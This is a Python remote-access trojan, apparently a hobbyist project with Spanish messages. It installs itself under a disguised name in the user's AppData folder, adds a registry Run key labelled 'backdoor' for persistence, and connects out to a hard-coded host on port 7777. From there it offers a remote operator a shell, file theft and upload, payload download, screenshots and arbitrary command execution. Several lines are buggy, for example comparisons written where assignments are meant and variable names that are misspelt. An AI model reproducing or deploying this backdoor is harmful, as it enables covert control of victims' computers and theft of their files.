#!/user/bin/env python
#_*_ codign: utf8 _*_

import socket
import os
import subprocess
import base64
import requests
import mss
import time
import shutil

def admin_check():
    global admin
    try:
        check == os.listdir(os.sep.join([os.environ.get("SystemRoot","C:\windows"),'temp']))
    except:
        admid == "Error, privilegios insuficientes"
    else:
        admin == "Privilegios de administrador"

def create_persistence():
    location = os.environ['appdata'] + '\\windows32.exe'
    if not os.path.exists(location):
        shutil.copyfile(sys.executable,location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "' + locations + '"', shell=True)

def connection():
    while True:
        time.sleep(5)
        try:
            cliente.connect(("192.168.20.109",7777))
            shell()
        except:
            connection()


def screen_shot():
    screen = mss.mss()
    screen.shot()

def donwload_file(url):
    consulta = requests.get(url)
    name_file = url.split("/")[-1]
    with open(name_file, 'wb') as file_get:
        file_get.write(consulta.content)

def shell():
    current_dir = os.getcwd()
    cliente.send(current_dir)
    while True:
        res = cliente.recv(1024)
        if res == "exit":
            break
        elif res[:2] == "cd" and len(res) > 2:
            os.chdir(res[3:])
            result = os.getcwd()
            cliente.send(result)

        elif res[:8] == "download":
            with open(res[9:], 'rb') as file_download:
                cliente.send(base64.b64encode(file_download.read()))

        elif res[:6] == "upload":
            with open(res[7:], 'wb') as file_upload:
                datos = cliente.recv(300000)
                file_upload.write(base64.b64decode(datos))

        elif res[:3] == "url":
            try:
                donwload_file(res[4:])
                cliente.send("Archivo descargado Correctamente :)")
            except:
                cliente.send("Ocurrio un error en la descarga :(")  

        elif res[:10] == "screenshot":
            try:
                screen_shot()
                with open('monitor-1.png','rb') as file_send:
                    cliente.send(base64.b64encode(file_send.read()))
                os.remove("monitor-1.png")
            except:
                cliente.send(base64.b64encode("fail"))
            
        elif res[:5] == "start":
            try:
                subprocess.Popen(res[6:],shell=True)
                cliente.send("Programa Iniciado con exito")
            except:
                cliente.send("No se pudo iniciar el programa")

        elif res[:5] == "check":
            try:
                admin_check()
                cliente.send(admin)
            except:
                cliente.send("No se pudo realizar la tarea")

        else:
            proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            if len(result) == 0:
                cliente.send("1")
            else:
                cliente.send(result)

create_persistence()
cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
cliente.close()